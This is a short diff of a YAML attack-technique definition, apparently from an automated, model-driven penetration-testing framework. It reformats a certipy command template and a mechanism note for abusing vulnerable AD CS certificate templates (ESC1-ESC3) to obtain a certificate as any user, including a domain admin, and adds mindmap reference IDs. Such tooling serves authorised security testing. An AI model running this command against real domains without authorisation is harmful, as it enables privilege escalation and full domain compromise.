@@ -6,8 +6,7 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: certipy req -u '{username}@{domain}' -p '{password}' -ca '{ca_name}'
-  -template '{template}' -dc-ip {target_ip}
+command_template: certipy req -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -template '{template}' -dc-ip {target_ip}
 parser: generic_parser
 expected_effects:
 - adcs_findings
@@ -16,7 +15,17 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: Requests certificate using vulnerable template (ESC1/ESC2/ESC3). With SAN
-  manipulation, can request cert as any user including DA. Resulting PFX used for
-  PKINIT auth.
+mechanism: Requests certificate using vulnerable template (ESC1/ESC2/ESC3). With SAN manipulation, can request cert as any
+  user including DA. Resulting PFX used for PKINIT auth.
 hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates.md
+references:
+  ocd_mindmap_node_ids:
+  - 1eab3dd158
+  - 37e8774343
+  - 4e40160940
+  - 682b8c0d85
+  - 6ef6b75aa3
+  - 7b1d58ff2d
+  - 92b68f891a
+  - 9d24a6572c
+  - b5b12fca9c
